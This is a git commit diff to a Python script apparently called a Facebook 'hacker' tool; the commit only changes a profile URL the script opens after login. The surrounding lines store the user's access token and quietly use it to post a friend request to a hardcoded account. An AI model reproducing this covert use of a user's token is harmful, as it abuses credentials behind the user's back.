d8945ddf2fec8c662102ad8acc4bb5268e377e02
KHONDOKAR-TICK <67585401+KHONDOKAR-TICK@users.noreply.github.com>
2020-08-12 00:15:59 +0600

    Update HACKER-RAJ.py

--- HACKER-RAJ.py
+++ HACKER-RAJ.py
@@ -256,7 +256,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful.•◈•..'
-				os.system('xdg-open https://www.facebook.com/Khondokar.rahim73')
+				os.system('xdg-open https://www.facebook.com/raj.hasan.3152130')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
